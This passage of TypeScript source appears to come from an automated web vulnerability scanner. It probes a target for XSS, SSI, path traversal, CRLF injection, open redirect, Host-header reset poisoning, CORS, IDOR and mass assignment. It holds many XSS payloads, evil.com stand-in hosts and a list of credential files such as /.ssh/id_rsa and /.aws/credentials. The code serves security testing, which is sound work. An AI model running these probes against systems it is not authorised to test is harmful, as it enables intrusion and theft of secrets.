      const resetEndpoints = ['/forgot-password', '/api/forgot-password', '/reset-password', '/api/reset-password', '/auth/forgot-password', '/auth/reset-password'];
      for (const endpoint of resetEndpoints) {
        try {
          const body = JSON.stringify({ email: 'test@test.com' });
          const res = await safeRequest(`${baseUrl}${endpoint}`, 'POST', {
            'Content-Type': 'application/json',
            'Host': evilHost,
            'X-Forwarded-Host': evilHost,
          }, body);
          if (res.body.toLowerCase().includes(evilHost) || res.body.toLowerCase().includes('reset') || res.redirectUrl?.includes(evilHost)) {
            findings.push(generateFinding(
              'Password Reset Poisoning via Host Header',
              `The application includes attacker-controlled host in password reset flow at ${endpoint}.`,
              Severity.CRITICAL,
              'Active Vulnerability',
              domain,
              `Endpoint: ${endpoint}, Host: ${evilHost}, Response/redirect contains evil.com`,
              'Password reset poisoning allows attackers to steal password reset tokens',
              'Use absolute URLs in password reset emails; validate Host header; never use Host header for URL generation',
              ['https://portswigger.net/web-security/host-header/password-reset-poisoning']
            ));
            break;
          }
        } catch {}
      }
    } catch {}
  } catch (e) { errors.push(`Host Header: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: SSI Injection ───
async function testSSI(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    const payloads = generateSSIPayloads();

    for (const { payload, indicator, type } of payloads) {
      try {
        const encodedPayload = encodeURIComponent(payload);
        const testUrls = [
          `${baseUrl}/?input=${encodedPayload}`,
          `${baseUrl}/?name=${encodedPayload}`,
          `${baseUrl}/?page=${encodedPayload}`,
          `${baseUrl}/?file=${encodedPayload}`,
          `${baseUrl}/?path=${encodedPayload}`,
        ];
        for (const testUrl of testUrls) {
          const res = await safeRequest(testUrl, 'GET', {}, '');
          if (indicator && indicator.split('|').some(i => res.body.toLowerCase().includes(i.toLowerCase()))) {
            findings.push(generateFinding(
              'Server-Side Includes (SSI) Injection',
              `The application processes SSI directives, allowing ${type}.`,
              Severity.HIGH,
              'Active Vulnerability',
              domain,
              `Type: ${type}, URL: ${testUrl}, Response contains SSI execution output`,
              'SSI injection can lead to remote code execution, file disclosure, and server compromise',
              'Disable SSI processing; sanitize all user input; use context-aware output encoding',
              ['https://owasp.org/www-community/attacks/Server_Side_Includes_Injection']
            ));
            return;
          }
        }
      } catch {}
    }
  } catch (e) { errors.push(`SSI: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: XSS (Reflected) ───
async function testXSS(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    logExploit('activeVuln', 'XSS', baseUrl, 'Testing reflected XSS on common parameters');
    const xssPayloads = [
      { payload: '<script>alert("XSS")</script>', indicator: '<script>alert', type: 'basic-script' },
      { payload: '"><img src=x onerror=alert(1)>', indicator: 'onerror=alert', type: 'img-onerror' },
      { payload: "'-alert(1)-'", indicator: 'alert(1)', type: 'event-handler' },
      { payload: '"><svg/onload=alert(1)>', indicator: 'onload=alert', type: 'svg-onload' },
      { payload: '{{7*7}}', indicator: '49', type: 'template-expression' },
      { payload: '${7*7}', indicator: '49', type: 'template-literal' },
      { payload: '<script>alert(document.cookie)</script>', indicator: '<script>alert', type: 'cookie-steal' },
      { payload: '"><iframe src="javascript:alert(1)">', indicator: 'javascript:alert', type: 'iframe-js' },
      { payload: "'-alert(1)-'", indicator: 'alert(1)', type: 'attribute-break' },
      { payload: '"><details open ontoggle=alert(1)>', indicator: 'ontoggle=alert', type: 'details-toggle' },
      { payload: '"><math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">', indicator: 'onerror=alert', type: 'mutation-xss' },
      { payload: 'javascript:alert(1)', indicator: 'javascript:alert', type: 'javascript-uri' },
      { payload: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', indicator: '<script>', type: 'html-entity' },
      { payload: '"><img src=x onerror=alert(document.domain)>', indicator: 'onerror=alert', type: 'img-onerror-domain' },
      { payload: '"><svg><animate onbegin=alert(1) attributeName=x dur=1s>', indicator: 'onbegin=alert', type: 'svg-animate' },
      { payload: '"/><form action=javascript:alert(1)><button>click</button></form>', indicator: 'javascript:alert', type: 'form-javascript' },
      { payload: '"><input onfocus=alert(1) autofocus>', indicator: 'onfocus=alert', type: 'input-autofocus' },
      { payload: '"><video><source onerror=alert(1)>', indicator: 'onerror=alert', type: 'video-source' },
      { payload: '"><svg><a xlink:href=javascript:alert(1)><text>Click</text></a></svg>', indicator: 'javascript:alert', type: 'svg-xlink' },
      { payload: '"><body onload=alert(1)>', indicator: 'onload=alert', type: 'body-onload' },
      { payload: '"><img src=x onerror="alert(1)">', indicator: 'onerror="alert', type: 'img-quoted' },
      { payload: '"><svg><script>alert(1)</script>', indicator: '<script>', type: 'svg-script' },
      { payload: '"><object data="javascript:alert(1)">', indicator: 'javascript:alert', type: 'object-data' },
      { payload: '"><a href="javascript:alert(1)">click</a>', indicator: 'javascript:alert', type: 'anchor-javascript' },
    ];

    const testParams = ['q', 'search', 'query', 'name', 'input', 'text', 'comment', 'page', 'redirect', 'url', 'callback'];

    for (const param of testParams) {
      let found = false;
      for (const { payload, indicator, type } of xssPayloads) {
        if (found) break;
        try {
          const encodedPayload = encodeURIComponent(payload);
          const testUrl = `${baseUrl}?${param}=${encodedPayload}`;
          const res = await safeRequest(testUrl, 'GET', {}, '');
          if (indicator.split('|').some(i => res.body.includes(i))) {
            findings.push(generateFinding(
              'Reflected Cross-Site Scripting (XSS)',
              `The application reflects user input without sanitization via parameter "${param}".`,
              Severity.CRITICAL,
              'Active Vulnerability',
              domain,
              `Parameter: ${param}, Type: ${type}, Payload reflected in response`,
              'XSS can steal session tokens, redirect users, and perform actions on their behalf',
              'Implement context-aware output encoding; use Content-Security-Policy; validate all input',
              ['https://owasp.org/www-community/attacks/xss/', 'https://portswigger.net/web-security/cross-site-scripting']
            ));
            found = true;
          }
          // Also check if the payload is reflected in the response body (even without the exact indicator)
          if (!found && res.body.length > 0 && payload.length > 3) {
            const bodyLower = res.body.toLowerCase();
            const payloadLower = payload.toLowerCase();
            // Check if any significant part of the payload is reflected
            if (bodyLower.includes(payloadLower) || bodyLower.includes(encodeURIComponent(payload).toLowerCase())) {
              // Check it's not just the URL in a link
              const isReflected = bodyLower.includes(`>${payloadLower}<`) || bodyLower.includes(`"${payloadLower}"`) || bodyLower.includes(`'${payloadLower}'`);
              if (isReflected) {
                findings.push(generateFinding(
                  `Reflected Input (Potential XSS) via "${param}"`,
                  `User input is reflected in the response without sanitization. Payload type: ${type}. While the exact XSS vector was not confirmed, reflected input may be exploitable with alternative payloads.`,
                  Severity.MEDIUM,
                  'Active Vulnerability',
                  domain,
                  `Parameter: ${param}, Reflected content: ${payload.substring(0, 50)}..., Status: ${res.statusCode}`,
                  'Reflected input can lead to XSS, HTML injection, or response splitting',
                  'Implement output encoding; validate and sanitize all user input',
                  ['https://owasp.org/www-community/attacks/xss/']
                ));
                found = true;
              }
            }
          }
          // 500 errors on XSS payloads are too noisy (WAFs, input validation, and generic error handling all produce 500)
          // Only report if we get an actual reflection — skip 500-only signals
        } catch {}
      }
    }

    // DOM-based XSS indicators
    try {
      const domPayloads = [
        '<script>document.write(location.hash.substring(1))</script>',
        '<script>eval(location.search.substring(1))</script>',
        '<script>document.body.innerHTML=location.hash.substring(1)</script>',
      ];
      for (const payload of domPayloads) {
        const res = await safeRequest(`${baseUrl}/?q=${encodeURIComponent(payload)}`, 'GET', {}, '');
        if (res.body.includes(payload) || res.body.includes('document.write') || res.body.includes('eval(')) {
          findings.push(generateFinding(
            'Potential DOM-Based XSS',
            'The application may be vulnerable to DOM-based XSS via client-side script injection.',
            Severity.HIGH,
            'Active Vulnerability',
            domain,
            `DOM XSS payload reflected in response without sanitization`,
            'DOM XSS can execute arbitrary JavaScript in the victim\'s browser',
            'Avoid dangerous DOM sinks; use textContent instead of innerHTML; implement CSP',
            ['https://owasp.org/www-community/attacks/DOM_Based_XSS']
          ));
          break;
        }
      }
    } catch {}
  } catch (e) { errors.push(`XSS: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Open Redirect ───
async function testOpenRedirect(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('activeVuln', 'Redirect', baseUrl, 'Testing open redirect via URL parameters');
  try {
    const redirectParams = ['redirect', 'url', 'next', 'return', 'returnTo', 'goto', 'to', 'out', 'continue', 'dest', 'redir', 'redirect_url', 'redirect_uri', 'return_url', 'checkout_url', 'next_url'];
    const payloads = generateRedirectPayloads();

    for (const param of redirectParams) {
      let found = false;
      for (const { url, indicator, type } of payloads) {
        if (found) break;
        try {
          const encodedPayload = encodeURIComponent(url);
          const testUrl = `${baseUrl}?${param}=${encodedPayload}`;
          const res = await safeRequest(testUrl, 'GET', {}, '');

          // Check redirect header
          if (res.redirectUrl && res.redirectUrl.toLowerCase().includes('evil.com')) {
            findings.push(generateFinding(
              'Open Redirect',
              `The application redirects to attacker-controlled URLs via parameter "${param}".`,
              Severity.HIGH,
              'Active Vulnerability',
              domain,
              `Parameter: ${param}, Type: ${type}, Redirect to: ${res.redirectUrl}`,
              'Open redirect can be used for phishing, OAuth token theft, and SSRF bypass',
              'Validate redirect targets against an allowlist; never use user input for redirects',
              ['https://portswigger.net/web-security/open-redirection']
            ));
            found = true;
          }
        } catch {}
      }
    }
  } catch (e) { errors.push(`Open Redirect: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Path Traversal ───
async function testPathTraversal(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('activeVuln', 'PathTraversal', baseUrl, 'Testing directory traversal via path segments');
  try {
    const payloads = generatePathTraversalPayloads();
    const endpoints = ['/file', '/download', '/view', '/include', '/read', '/static', '/images', '/assets', '/api/file', '/api/download'];

    for (const endpoint of endpoints) {
      let found = false;
      for (const { path, indicator, type } of payloads) {
        if (found) break;
        try {
          const testUrl = `${baseUrl}${endpoint}/${path}`;
          const res = await safeRequest(testUrl, 'GET', {}, '');
          if (indicator.split('|').some(i => res.body.toLowerCase().includes(i.toLowerCase()))) {
            findings.push(generateFinding(
              'Path Traversal',
              `The application is vulnerable to path traversal at ${endpoint}.`,
              Severity.HIGH,
              'Active Vulnerability',
              domain,
              `Endpoint: ${endpoint}, Type: ${type}, Response contains file system content`,
              'Path traversal can expose sensitive files, configuration, and credentials',
              'Validate file paths against allowlist; use chroot/containerization; normalize paths before validation',
              ['https://owasp.org/www-community/attacks/Path_Traversal']
            ));
            found = true;
          }
        } catch {}
      }
    }
  } catch (e) { errors.push(`Path Traversal: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Header Injection ───
async function testHeaderInjection(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    const payloads = generateHeaderInjectionPayloads();
    const params = ['name', 'input', 'value', 'text', 'query', 'search'];

    for (const param of params) {
      let found = false;
      for (const { payload, type, indicator } of payloads) {
        if (found) break;
        try {
          const testUrl = `${baseUrl}?${param}=${encodeURIComponent(payload)}`;
          const res = await safeRequest(testUrl, 'GET', {}, '');

          // Check response headers for injected headers
          const headerStr = JSON.stringify(res.headers).toLowerCase();
          if (headerStr.includes(indicator.toLowerCase())) {
            findings.push(generateFinding(
              'Header Injection (CRLF)',
              `The application is vulnerable to header injection via parameter "${param}".`,
              Severity.HIGH,
              'Active Vulnerability',
              domain,
              `Parameter: ${param}, Type: ${type}, Injected header detected in response`,
              'Header injection can lead to XSS, cache poisoning, and session fixation',
              'Validate and sanitize all input; filter CRLF characters; use safe HTTP libraries',
              ['https://owasp.org/www-community/vulnerabilities/HTTP_Header_Injection']
            ));
            found = true;
          }
        } catch {}
      }
    }
  } catch (e) { errors.push(`Header Injection: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: GraphQL Security ───
async function testGraphQL(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    const graphqlPaths = ['/graphql', '/api/graphql', '/v1/graphql', '/v2/graphql', '/gql', '/query', '/api/v1/graphql'];
    const payloads = generateGraphQLPayloads();

    for (const path of graphqlPaths) {
      let found = false;
      for (const { query, indicator, type } of payloads) {
        if (found) break;
        try {
          const res = await safeRequest(`${baseUrl}${path}`, 'POST', { 'Content-Type': 'application/json' }, query);
          if (res.statusCode === 200 && indicator.split('|').some(i => res.body.toLowerCase().includes(i.toLowerCase()))) {
            const severity = type === 'introspection' ? Severity.HIGH :
              type.includes('batching') ? Severity.MEDIUM :
              type.includes('depth') || type.includes('alias') ? Severity.MEDIUM : Severity.HIGH;
            findings.push(generateFinding(
              `GraphQL Security Issue (${type})`,
              `The application has a GraphQL security weakness at ${path}: ${type}.`,
              severity,
              'Active Vulnerability',
              domain,
              `Endpoint: ${path}, Type: ${type}, Response matches indicator`,
              'GraphQL misconfigurations can expose sensitive data and enable denial of service',
              'Disable introspection in production; implement query depth limiting, rate limiting, and cost analysis',
              ['https://graphql.org/learn/introspection/', 'https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html']
            ));
            found = true;
          }
        } catch {}
      }
    }
  } catch (e) { errors.push(`GraphQL: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: WebDAV Detection ───
async function testWebDAV(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    const davMethods = ['PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK', 'CHECKOUT', 'CHECKIN', 'VERSION-CONTROL', 'REPORT', 'BASELINE-CONTROL', 'MKACTIVITY', 'MERGE'];
    for (const method of davMethods) {
      try {
        const res = await safeRequest(`${baseUrl}/`, method, {}, '');
        if ([207, 201, 200, 405].includes(res.statusCode)) {
          const allowHeader = (res.headers['allow'] || '').toString().toUpperCase();
          if (allowHeader.includes(method) || res.statusCode === 207) {
            findings.push(generateFinding(
              'WebDAV Enabled',
              `The server supports WebDAV method ${method}, which may expose file operations.`,
              Severity.HIGH,
              'Active Vulnerability',
              domain,
              `Method: ${method}, Response: ${res.statusCode}, Allow: ${allowHeader.substring(0, 200)}`,
              'WebDAV allows file listing, upload, modification, and deletion via HTTP',
              'Disable WebDAV if not required; restrict to authenticated users; implement access controls',
              ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods']
            ));
            break;
          }
        }
      } catch {}
    }
  } catch (e) { errors.push(`WebDAV: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: API Security (BOLA/IDOR, Mass Assignment, Rate Limit) ───
async function testAPISecurity(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    // BOLA/IDOR Detection
    const idorPaths = [
      '/api/users/1', '/api/users/2', '/api/users/100',
      '/api/admin', '/api/admin/users', '/api/internal',
      '/api/v1/users/1', '/api/v1/admin',
      '/user/1', '/user/2', '/profile/1', '/profile/2',
      '/api/documents/1', '/api/files/1',
    ];
    for (const path of idorPaths) {
      try {
        const res = await safeRequest(`${baseUrl}${path}`, 'GET', {}, '');
        if (res.statusCode === 200 && res.body.length > 10) {
          // Require structured data with user-specific fields (not just any JSON)
          const isDataResponse = res.body.includes('{') && (
            (res.body.includes('email') && res.body.includes('@')) ||
            (res.body.includes('phone') && /\d{3,}/.test(res.body)) ||
            (res.body.includes('address') && res.body.length > 200) ||
            (res.body.includes('ssn') || res.body.includes('social_security')) ||
            (res.body.includes('credit_card') || res.body.includes('card_number'))
          );
          // Must NOT look like a generic API error/empty response
          const isGenericError = res.body.includes('"error"') || res.body.includes('"message"') || res.body.includes('"status":') && res.body.length < 500;
          if (isDataResponse && !isGenericError) {
            findings.push(generateFinding(
              'Potential BOLA/IDOR',
              `The endpoint ${path} returns data without apparent access control.`,
              Severity.HIGH,
              'Active Vulnerability',
              domain,
              `Endpoint: ${path}, Status: ${res.statusCode}, Response contains structured data`,
              'BOLA/IDOR allows unauthorized access to other users\' data by manipulating resource IDs',
              'Implement proper authorization checks; use UUIDs instead of sequential IDs; validate ownership',
              ['https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/']
            ));
            break;
          }
        }
      } catch {}
    }

    // Rate Limiting Test
    try {
      const rateLimitResults: number[] = [];
      for (let i = 0; i < 15; i++) {
        try {
          const res = await safeRequest(`${baseUrl}/api/auth/login`, 'POST', {
            'Content-Type': 'application/json',
          }, JSON.stringify({ email: 'test@test.com', password: 'wrong' }));
          rateLimitResults.push(res.statusCode);
        } catch {}
      }
      const rateLimited = rateLimitResults.some(code => code === 429);
      if (!rateLimited && rateLimitResults.length >= 15) {
        findings.push(generateFinding(
          'Missing Rate Limiting',
          'The login endpoint does not implement rate limiting, allowing brute force attacks.',
          Severity.HIGH,
          'Active Vulnerability',
          domain,
          `15 consecutive login attempts returned ${[...new Set(rateLimitResults)].join(', ')}, no 429 responses`,
          'Missing rate limiting enables brute force, credential stuffing, and denial of service',
          'Implement rate limiting with progressive delays; use CAPTCHA after failed attempts; lock accounts after threshold',
          ['https://owasp.org/www-community/Controls/Blocking_Brute_Force_Attacks']
        ));
      }
    } catch {}

    // Mass Assignment Test
    try {
      const massAssignPayloads = [
        { username: 'testuser', email: 'test@test.com', role: 'admin' },
        { username: 'testuser', email: 'test@test.com', isAdmin: true },
        { username: 'testuser', email: 'test@test.com', permissions: ['admin', 'write'] },
        { username: 'testuser', email: 'test@test.com', admin: true },
      ];
      for (const payload of massAssignPayloads) {
        try {
          const res = await safeRequest(`${baseUrl}/api/register`, 'POST', {
            'Content-Type': 'application/json',
          }, JSON.stringify(payload));
          if (res.body.toLowerCase().includes('admin') || res.body.toLowerCase().includes('role')) {
            findings.push(generateFinding(
              'Potential Mass Assignment',
              'The registration endpoint may allow setting privileged fields via mass assignment.',
              Severity.HIGH,
              'Active Vulnerability',
              domain,
              `Payload with role/admin field sent, response may contain privileged data`,
              'Mass assignment allows attackers to escalate privileges by setting unexpected fields',
              'Use allowlists for mass-assignable attributes; validate and sanitize all input',
              ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_Mass_Assignment']
            ));
            break;
          }
        } catch {}
      }
    } catch {}
  } catch (e) { errors.push(`API Security: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: CORS Misconfiguration ───
async function testCORS(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    const fakeOrigins = [
      'https://evil.com',
      'https://attacker.example.com',
      'null',
      'https://evil.' + domain,
      domain.replace('www', 'evil'),
    ];
    for (const origin of fakeOrigins) {
      try {
        const res = await safeRequest(baseUrl, 'OPTIONS', {
          'Origin': origin,
          'Access-Control-Request-Method': 'GET',
          'Access-Control-Request-Headers': 'Authorization,Content-Type',
        }, '');
        const acao = res.headers['access-control-allow-origin'];
        const acac = res.headers['access-control-allow-credentials'];
        if (acao && (acao === '*' || acao === origin) && acac === 'true') {
          findings.push(generateFinding(
            'CORS Misconfiguration (Origin Reflection)',
            `The server reflects arbitrary Origin headers with credentials, allowing cross-site data theft.`,
            Severity.HIGH,
            'Security Headers',
            domain,
            `Origin: ${origin}, ACAO: ${acao}, ACAC: ${acac}`,
            'Any malicious website can make authenticated requests on behalf of users',
            'Restrict CORS to specific trusted origins; never reflect arbitrary origins with credentials',
            ['https://portswigger.net/web-security/cors/origin-reflection']
          ));
          break;
        }
      } catch {}
    }

    // Test for wildcard with credentials
    try {
      const res = await safeRequest(baseUrl, 'OPTIONS', {
        'Origin': 'https://evil.com',
        'Access-Control-Request-Method': 'GET',
      }, '');
      const acao = res.headers['access-control-allow-origin'];
      if (acao === '*') {
        findings.push(generateFinding(
          'CORS Wildcard with Potential Credential Leakage',
          'The server returns Access-Control-Allow-Origin: * which may indicate permissive CORS policy.',
          Severity.MEDIUM,
          'Security Headers',
          domain,
          'ACAO: *',
          'Wildcard CORS with any credential exposure allows data theft from any origin',
          'Use specific origin allowlists instead of wildcard',
          ['https://portswigger.net/web-security/cors']
        ));
      }
    } catch {}
  } catch (e) { errors.push(`CORS: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: WAF/Security Detection ───
async function testWAF(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    // WAF detection via malicious payload
    try {
      const testUrl = `${baseUrl}/?id=<script>alert(1)</script>`;
      const res = await safeRequest(testUrl, 'GET', {}, '');
      if (res.statusCode === 403 || res.statusCode === 406 || res.statusCode === 419 || res.statusCode === 429) {
        findings.push(generateFinding(
          'WAF/Security Product Detected',
          'A Web Application Firewall or security product appears to be protecting this application.',
          Severity.INFO,
          'Active Vulnerability',
          domain,
          `Status: ${res.statusCode} in response to XSS payload`,
          'WAF may block some attack vectors but can potentially be bypassed',
          'Verify WAF coverage; implement defense-in-depth beyond WAF',
          []
        ));
      }
    } catch {}

    // Server header information disclosure
    try {
      const res = await safeRequest(baseUrl, 'GET', {}, '');
      const server = (res.headers['server'] || '').toString();
      const xPoweredBy = (res.headers['x-powered-by'] || '').toString();
      if (server && /\d+\.\d+/.test(server)) {
        findings.push(generateFinding(
          'Server Version Disclosure',
          `The Server header reveals version information: "${server}".`,
          Severity.LOW,
          'Active Vulnerability',
          domain,
          `Server: ${server}`,
          'Version information helps attackers identify known vulnerabilities',
          'Remove version information from Server header; suppress X-Powered-By',
          ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Enumerate_Infrastructure_and_Application_Admin_Interfaces']
        ));
      }
      if (xPoweredBy) {
        findings.push(generateFinding(
          'X-Powered-By Header Disclosure',
          `The X-Powered-By header reveals technology: "${xPoweredBy}".`,
          Severity.LOW,
          'Active Vulnerability',
          domain,
          `X-Powered-By: ${xPoweredBy}`,
          'Technology disclosure helps attackers identify attack surface',
          'Remove X-Powered-By header',
          ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Enumerate_Infrastructure_and_Application_Admin_Interfaces']
        ));
      }
    } catch {}
  } catch (e) { errors.push(`WAF: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Directory/Endpoint Enumeration ───
async function testDirectoryEnum(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    const sensitivePaths = [
      '/.env', '/.git/config', '/.git/HEAD', '/.gitignore',
      '/robots.txt', '/sitemap.xml', '/.well-known/security.txt',
      '/wp-admin', '/wp-login.php', '/wp-config.php.bak',
      '/phpinfo.php', '/info.php', '/test.php',
      '/.htaccess', '/.htpasswd',
      '/server-status', '/server-info',
      '/actuator', '/actuator/health', '/actuator/env', '/actuator/beans',
      '/swagger-ui.html', '/swagger.json', '/api-docs', '/openapi.json',
      '/.DS_Store', '/Thumbs.db', '/web.config',
      '/crossdomain.xml', '/clientaccesspolicy.xml',
      '/elmah.axd', '/trace.axd', '/webadmin.axd',
      '/backup', '/backup.zip', '/backup.sql', '/db.sql', '/database.sql',
      '/config.php', '/config.json', '/config.yml', '/config.yaml', '/settings.json',
      '/debug', '/debug/pprof', '/debug/vars',
      '/metrics', '/prometheus',
      '/_debug', '/_profiler', '/_wdt',
      '/vendor', '/composer.json', '/package.json',
      // Additional backup & source exposure paths
      '/.dockerignore', '/Dockerfile', '/docker-compose.yml',
      '/.npmrc', '/.pypirc', '/.aws/credentials', '/.ssh/id_rsa',
      '/.env.local', '/.env.production', '/.env.test',
      '/application.properties', '/application.yml',
      '/web.config.bak', '/web.config.old', '/config.old', '/config.bak',
      '/dump.sql', '/db_backup.sql', '/backup.tar', '/backup.tar.gz', '/backup.zip',
      '/app.js.map', '/app.ts.map', '/main.js.map', '/index.js.map',
      '/.well-known/appspecific/com.apple.configurationprofiles',
      // Source control & CI/CD exposure
      '/.svn/entries', '/.hg/store/data', '/.bzr',
      '/.circleci/config.yml', '/.travis.yml', '/.github/workflows/deploy.yml',
      '/azure-pipelines.yml', '/Jenkinsfile',
      '/server-status?full=true', '/health', '/info', '/env', '/error',
      // CMS and framework admin panels
      '/administrator/', '/adminer.php', '/phpmyadmin/index.php',
      '/wp-json/wp/v2/users', '/rest-api', '/api/user', '/api/me',
    ];

    const foundPaths: string[] = [];
    const alwaysFlag = ['/.env', '/.git/config', '/.git/HEAD', '/.gitignore', '/phpinfo.php', '/info.php', '/test.php', '/.htpasswd', '/.DS_Store', '/backup.sql', '/db.sql', '/database.sql', '/dump.sql', '/.ssh/id_rsa', '/.aws/credentials', '/.env.local', '/.env.production', '/.env.test', '/config.php', '/config.json', '/config.yml', '/config.yaml', '/settings.json', '/docker-compose.yml', '/Dockerfile', '/Jenkinsfile', '/.travis.yml', '/.circleci/config.yml', '/.github/workflows/deploy.yml'];
    for (const path of sensitivePaths) {
      try {
        const res = await safeRequest(`${baseUrl}${path}`, 'GET', {}, '');
        if (res.statusCode === 200 && res.body.length > 0) {
          const isAlways = alwaysFlag.some(p => path.startsWith(p));
          if (!isAlways) {
            const isSPA = res.body.includes('<!DOCTYPE html') || res.body.includes('<html') || res.body.includes('__next') || res.body.includes('react-root');
            if (isSPA) continue;
          }

          const bodyLower = res.body.toLowerCase();
          const isSensitive = isAlways || bodyLower.includes('password') || bodyLower.includes('secret') ||
            bodyLower.includes('database') || bodyLower.includes('db_') ||
            bodyLower.includes('api_key') || bodyLower.includes('private') ||
            bodyLower.includes('[core]') || bodyLower.includes('document_root') ||
            bodyLower.includes('phpinfo') || bodyLower.includes('redis') ||
            bodyLower.includes('mysql') || bodyLower.includes('postgres') ||
            bodyLower.includes('mongodb') || bodyLower.includes('elastic') ||
            bodyLower.includes('app_key') || bodyLower.includes('app_secret') ||
            bodyLower.includes('access_key') || bodyLower.includes('aws_') ||
            bodyLower.includes('connection_string') || bodyLower.includes('jdbc:') ||
            bodyLower.includes('dsn=') || bodyLower.includes('credential') ||
            bodyLower.includes('BEGIN RSA') || bodyLower.includes('PRIVATE KEY') ||
            bodyLower.includes('AKIA') || bodyLower.includes('launch') ||
            bodyLower.includes('[remote') || bodyLower.includes('url =') ||
            bodyLower.includes('DB_PASSWORD') || bodyLower.includes('DB_HOST');
          if (isSensitive) {
            foundPaths.push(path);
          }
        }
      } catch {}
    }

    if (foundPaths.length > 0) {
      findings.push(generateFinding(
        'Sensitive Files/Endpoints Exposed',
        `${foundPaths.length} sensitive path(s) are publicly accessible.`,
        Severity.HIGH,
        'Active Vulnerability',
        domain,
        `Exposed paths: ${foundPaths.join(', ')}`,
        'Exposed sensitive files can leak credentials, configuration, and internal architecture',
        'Restrict access to sensitive files; implement proper access controls; remove default files',
        ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces']
      ));
    }
  } catch (e) { errors.push(`Directory Enum: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Cookie Security ───
async function testCookieSecurity(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    const res = await safeRequest(baseUrl, 'GET', {}, '');
    const setCookieHeaders = res.headers['set-cookie'];
    if (setCookieHeaders) {
      const cookies = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
      for (const cookie of cookies) {
        const cookieLower = cookie.toLowerCase();
        const cookieName = cookie.split('=')[0].trim();

        // Missing Secure flag
        if (!cookieLower.includes('secure')) {
          findings.push(generateFinding(
            'Cookie Missing Secure Flag',
            `Cookie "${cookieName}" is missing the Secure flag.`,
            Severity.MEDIUM,
            'Active Vulnerability',
            domain,
            `Cookie: ${cookie.substring(0, 150)}`,
            'Cookies without Secure flag can be intercepted over HTTP',
            'Add Secure flag to all cookies',
            ['https://owasp.org/www-community/Controls/SecureCookieAttribute']
          ));
        }

        // Missing HttpOnly flag
        if (!cookieLower.includes('httponly')) {
          findings.push(generateFinding(
            'Cookie Missing HttpOnly Flag',
            `Cookie "${cookieName}" is missing the HttpOnly flag.`,
            Severity.MEDIUM,
            'Active Vulnerability',
            domain,
            `Cookie: ${cookie.substring(0, 150)}`,
            'Cookies without HttpOnly can be stolen via XSS attacks',
            'Add HttpOnly flag to session cookies',
            ['https://owasp.org/www-community/Controls/SecureCookieAttribute']
          ));
        }

        // Missing SameSite
        if (!cookieLower.includes('samesite')) {
          findings.push(generateFinding(
            'Cookie Missing SameSite Flag',
            `Cookie "${cookieName}" is missing the SameSite attribute.`,
            Severity.LOW,
            'Active Vulnerability',
            domain,
            `Cookie: ${cookie.substring(0, 150)}`,
            'Cookies without SameSite are vulnerable to CSRF attacks',
            'Add SameSite=Lax or SameSite=Strict',
            ['https://owasp.org/www-community/SameSite']
          ));
        }
      }
    }
  } catch (e) { errors.push(`Cookie: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Error Handling / Information Disclosure ───
async function testErrorHandling(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  try {
    // Trigger error pages
    const errorTriggers = [
      '/%00', '/../../../etc/passwd', '/<script>', '/?id=%27',
      '/api/nonexistent', '/undefined', '/*', '/?',
    ];
    for (const trigger of errorTriggers) {
      try {
        const res = await safeRequest(`${baseUrl}${trigger}`, 'GET', {}, '');
        const bodyLower = res.body.toLowerCase();

        // Stack trace disclosure
        if (bodyLower.includes('stack trace') || bodyLower.includes('at line') || bodyLower.includes('stacktrace')) {
          findings.push(generateFinding(
            'Stack Trace Disclosure',
            'The application exposes stack traces in error responses.',
            Severity.MEDIUM,
            'Active Vulnerability',
            domain,
            `Trigger: ${trigger}, Response contains stack trace`,
